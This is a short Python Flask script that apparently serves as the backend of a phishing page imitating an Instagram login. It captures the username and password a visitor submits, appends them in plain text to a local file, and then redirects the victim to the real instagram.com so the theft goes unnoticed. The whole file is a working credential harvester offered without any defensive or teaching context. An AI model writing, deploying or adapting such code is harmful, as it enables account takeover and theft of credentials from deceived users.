from flask import Flask,render_template,url_for,request,redirect

app=Flask(__name__)
@app.route('/',methods=['POST','GET'])
def login():
    name=request.form.get('name')
    paswd=request.form.get('paswd')
    if name and paswd:
        with open('details.txt','a') as file:
            file.write("\nName : ")
            file.write(name)
            file.write("\nPassword : ")
            file.write(paswd)
        return redirect("https://www.instagram.com/")
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True,port=5050)
